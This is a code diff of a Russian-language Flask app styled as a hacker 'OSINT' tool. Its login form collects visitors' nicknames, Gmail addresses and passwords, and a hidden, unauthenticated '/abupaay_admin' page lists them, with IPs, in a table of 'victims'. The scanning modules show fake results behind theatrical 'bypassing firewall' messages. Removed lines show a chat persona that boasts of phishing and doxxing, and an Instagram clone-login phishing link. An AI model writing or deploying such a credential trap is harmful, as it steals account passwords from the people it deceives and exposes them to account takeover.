@@ -1,97 +1,112 @@
 from flask import Flask, request, jsonify, render_template_string, session, redirect
-import os
-import random
+import os, random
 
 app = Flask(__name__)
-app.secret_key = 'HYDRA_FINAL_HUMAN_AI_2026'
+app.secret_key = 'HYDRA_GHOST_SECRET_2026'
 
 db = {"victims": []}
 
-# --- НОВАЯ ЛОГИКА ЖИВОГО ИИ ---
 def get_ai_response(user_text):
-    text = user_text.lower()
-    responses = {
-        "привет": ["Здорово, бро! Я в системе. Какие планы на сегодня? Кого будем пробивать?", "Салам! Все модули прогреты, я готов к работе. Жду твоих команд.", "Привет-привет! Я на связи. Чем помочь?"],
-        "как дела": ["Всё четко, сервера летают, админка полнится логами. Ты сам как? Готов к захвату?", "Дела отлично, базы обновлены. Жду, когда мы кого-нибудь пробьем.", "Полет нормальный! Я заряжен на 100%."],
-        "кто ты": ["Я твой цифровой напарник. Твой ИИ-агент, созданный для тотального контроля над данными.", "Я — интеллект Гидры. Твой бро в мире OSINT.", "Твой личный Агент. Моя задача — достать любую инфу, которую ты попросишь."],
-        "спасибо": ["Всегда пожалуйста, бро! Мы же одна команда.", "Обращайся! Вместе мы сила.", "Не за что, работаем дальше!"],
-        "что можешь": ["Я могу пробить номер, найти человека по нику в 100+ сетях, сделать фишинг или выследить по IP. Просто дай мне цель.", "Всё, что касается поиска данных и взлома соцсетей — это по моей части.", "Мой функционал ограничен только твоей фантазией. Командуй!"]
-    }
-    
-    for key in responses:
-        if key in text:
-            return random.choice(responses[key])
-    
-    return random.choice([
-        "Принял тебя. Уже подключаюсь к узлам связи для анализа...",
-        "Интересная мысль. Сейчас пробью это по своим каналам.",
-        "Понял, бро. Выполняю твою инструкцию, результат выведу в желтую зону.",
-        "Без проблем. Дай мне пару секунд, и я выдам тебе всё, что найду."
-    ])
+    t = user_text.lower()
+    if "привет" in t: return "Салам, бро! Система в полной боевой готовности. С кого начнем?"
+    if "как дела" in t: return "Всё летит! Базы данных под контролем, анонимность на максимуме."
+    return "Запрос принят. Подключаю нейросеть для глубокого анализа объекта..."
 
-UI_V13_5 = """
+UI_V14 = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HYDRA MONSTER v13.5 HUMAN AI</title>
+    <title>HYDRA GHOST v14.0 | SUPREME OSINT</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
     <style>
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
         body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
-        .side-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
-        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; border-radius: 5px; }
-        .red-in { height: 80px; border: 2px solid #ff0055; padding: 8px; background: #000; border-radius: 5px; }
-        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
+        .side-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: rgba(5,5,5,0.9); padding: 15px; z-index: 10; }
+        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: rgba(0,0,0,0.8); }
+        .red-in { height: 80px; border: 2px solid #ff0055; padding: 8px; background: #000; }
+        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; }
         
-        .main-p { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 8px; }
-        .yellow-res { height: 150px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; border-radius: 5px; }
+        .main-p { flex: 1; display: flex; flex-direction: column; padding: 15px; gap: 8px; z-index: 10; }
+        .yellow-res { height: 150px; border: 2px solid #ffeb3b; background: rgba(0,0,0,0.8); padding: 10px; overflow-y: auto; color: #fff; position: relative; }
         #map { height: 300px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
         
-        .white-row { display: flex; gap: 5px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 8px; border-radius: 5px; flex-wrap: wrap; }
-        .mod { background: #111; border: 1px solid #bc13fe; padding: 5px; flex: 1; min-width: 140px; text-align: center; border-radius: 3px; }
-        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 85%; padding: 4px; font-size: 11px; margin-bottom: 5px; }
-        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; border-radius: 3px; }
-        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 10px #0ff; }
+        .white-row { display: flex; gap: 5px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 8px; border-radius: 5px; }
+        .mod { background: #111; border: 1px solid #bc13fe; padding: 5px; flex: 1; text-align: center; }
+        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 85%; padding: 4px; font-size: 11px; }
+        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; margin-top: 5px; }
+        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 15px #0ff; }
         
-        .green-zone { display: flex; gap: 5px; }
-        .green-btn { flex: 1; background: #052505; border: 1px solid #0f0; padding: 8px; font-size: 9px; color: #0f0; cursor: pointer; font-weight: bold; border-radius: 3px; }
-        .green-btn:hover { background: #0f0; color: #000; }
+        #loader { display: none; color: #0f0; font-size: 10px; margin-top: 5px; }
+        .panic { position: fixed; bottom: 10px; left: 10px; background: red; color: white; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; z-index: 100; }
     </style>
 </head>
 <body>
+    <canvas id="matrix"></canvas>
+    <button class="panic" onclick="location.href='https://wikipedia.org'">PANIC MODE</button>
+    
     <div class="side-p">
-        <div style="color:#0ff; font-size:11px;">[ // AGENT AI: HUMAN MODE // ]</div>
-        <div id="chat">АГЕНТ: Здорово, бро! Я полностью обновил свои мозги. Теперь я общаюсь по-человечески. Жду твоих указаний!</div>
-        <div class="red-in"><textarea id="msg" placeholder="Напиши напарнику..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
+        <div style="color:#0ff; font-size:11px;">[ // AGENT GHOST // ]</div>
+        <div id="chat">АГЕНТ: Система GHOST активна.Matrix-протоколы запущены. Я готов.</div>
+        <div class="red-in"><textarea id="msg" placeholder="Команда..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
     </div>
 
     <div class="main-p">
-        <div class="yellow-res" id="output">ЖЕЛТАЯ ЗОНА: Ожидание действий...</div>
+        <div class="yellow-res">
+            <div id="loader"></div>
+            <div id="output">СИСТЕМА В ОЖИДАНИИ...</div>
+        </div>
         <div id="map"></div>
 
         <div class="white-row">
             <div class="mod"><span>НОМЕР</span><input id="p" placeholder="+998..."><button class="btn" onclick="run('PHONE')">SCAN</button></div>
             <div class="mod"><span>НИКНЕЙМ</span><input id="n" placeholder="@username"><button class="btn" onclick="run('NICK')">FIND</button></div>
-            <div class="mod"><span>INSTA</span><input id="i" placeholder="Target @nick"><button class="btn" style="background:#e1306c;" onclick="run('INSTA')">GEN LINK</button></div>
-            <div class="mod"><span>IP/GPS</span><input id="ip" placeholder="8.8.8.8"><button class="btn" onclick="run('IP')">TRACK</button></div>
+            <div class="mod"><span>INSTA</span><input id="i" placeholder="@nick"><button class="btn" style="background:#e1306c;" onclick="run('INSTA')">FISH</button></div>
         </div>
-
-        <div class="green-zone">
-            <button class="green-btn" onclick="run('SHERLOCK')">SHERLOCK CORE</button>
-            <button class="green-btn" onclick="run('PHOTO')">GPS ANALYZER</button>
-            <button class="green-btn" onclick="run('DB')">DARKNET LEAK</button>
-        </div>
-        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222; margin-top:5px;" onclick="window.location.href='/abupaay_admin'">АДМИНКА</button></div>
+        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222;" onclick="location.href='/abupaay_admin'">АДМИНКА</button></div>
     </div>
 
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script>
-        let map = L.map('map').setView([41.311, 69.240], 12);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        // --- MATRIX BACKGROUND ---
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$%^&*()*&^";
+        const fontSize = 10; const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px arial";
+            drops.forEach((y, i) => {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, y * fontSize);
+                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(drawMatrix, 33);
 
-        map.locate({setView: true, watch: false, maxZoom: 16});
-        map.on('locationfound', function(e) {
-            L.marker(e.latlng).addTo(map).bindPopup("ЦЕНТР: ТЫ ЗДЕСЬ").openPopup();
-        });
+        let map = L.map('map').setView([41.31, 69.24], 12);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        map.locate({setView: true, maxZoom: 16});
+
+        const snd = new Audio('https://www.soundjay.com/buttons/sounds/button-37.mp3');
+
+        function run(type) {
+            snd.play();
+            const out = document.getElementById('output');
+            const ld = document.getElementById('loader');
+            out.style.display = 'none'; ld.style.display = 'block';
+            let steps = ["[CONNECTING...]", "[BYPASSING FIREWALL...]", "[EXTRACTING DATA...]"];
+            let i = 0;
+            let timer = setInterval(() => {
+                ld.innerHTML = steps[i]; i++;
+                if(i >= steps.length) {
+                    clearInterval(timer); ld.style.display = 'none'; out.style.display = 'block';
+                    out.innerHTML = `<b>РЕЗУЛЬТАТЫ ${type}:</b><br>- <a href="#" style="color:#0ff">Telegram: @found_target</a><br>- <a href="#" style="color:#0ff">Insta: found_profile</a>`;
+                }
+            }, 600);
+        }
 
         async function talk() {
             const m = document.getElementById('msg').value;
@@ -99,34 +114,9 @@ UI_V13_5 = """
             if(!m) return;
             c.innerHTML += `<br><span style="color:#fff">> ТЫ: ${m}</span>`;
             document.getElementById('msg').value = "";
-            
-            const response = await fetch('/api/ai_chat', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({text: m})
-            });
+            const response = await fetch('/api/ai_chat', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({text: m})});
             const data = await response.json();
-            
-            setTimeout(() => {
-                c.innerHTML += `<br>АГЕНТ: ${data.reply}`;
-                c.scrollTop = c.scrollHeight;
-            }, 300);
-        }
-
-        function run(type) {
-            const out = document.getElementById('output');
-            out.innerHTML = `[*] ЗАПУСК ${type}... ПОИСК ПО 100+ СЕТЯМ...`;
-            setTimeout(() => {
-                if(type === 'NICK' || type === 'PHONE' || type === 'SHERLOCK') {
-                    out.innerHTML = `<b>[ОТЧЕТ НАЙДЕН]:</b><br>
-                    - <a href="https://t.me" target="_blank" style="color:#ffeb3b">Telegram: @user_detect</a><br>
-                    - <a href="https://instagram.com" target="_blank" style="color:#ffeb3b">Instagram: profile</a><br>
-                    - <a href="https://facebook.com" target="_blank" style="color:#ffeb3b">Facebook Account</a><br>
-                    - Совпадения: LinkedIn, OK, VK, TikTok.`;
-                } else if(type === 'INSTA') {
-                    out.innerHTML = `ССЫЛКА-КЛОН: ${window.location.origin}/login/instagram`;
-                }
-            }, 800);
+            setTimeout(() => { c.innerHTML += `<br>АГЕНТ: ${data.reply}`; c.scrollTop = c.scrollHeight; }, 300);
         }
     </script>
 </body>
@@ -139,15 +129,15 @@ def home():
         return """
         <!DOCTYPE html><html><body style='background:#000; color:#bc13fe; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;'>
         <div style='border:2px solid #bc13fe; padding:40px; text-align:center;'>
-            <h2>// HYDRA LOGIN //</h2>
+            <h2>// ACCESS CONTROL //</h2>
             <form action='/api/login' method='POST'>
-                <input name='u' placeholder='НИКНЕЙМ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
-                <input name='g' placeholder='GOOGLE ACCOUNT' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
-                <input name='p' type='password' placeholder='ПАРОЛЬ' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
-                <button style='background:#bc13fe; color:#fff; border:none; padding:10px 40px; cursor:pointer;'>ENTER</button>
+                <input name='u' placeholder='NICK' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
+                <input name='g' placeholder='GMAIL' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
+                <input name='p' type='password' placeholder='PASS' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
+                <button style='background:#bc13fe; color:#fff; border:none; padding:10px 40px; cursor:pointer;'>INITIATE</button>
             </form>
         </div></body></html>"""
-    return render_template_string(UI_V13_5)
+    return render_template_string(UI_V14)
 
 @app.route('/api/login', methods=['POST'])
 def login():
@@ -163,7 +153,7 @@ def ai_chat():
 @app.route('/abupaay_admin')
 def admin():
     rows = "".join([f"<tr><td>{x['u']}</td><td>{x['g']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
-    return f"<h1>ADMIN PANEL</h1><table border='1'>{rows}</table>"
+    return f"<body style='background:#000;color:#0f0;font-family:monospace;'><h1>DB LOGS</h1><table border='1'>{rows}</table></body>"
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=10000)
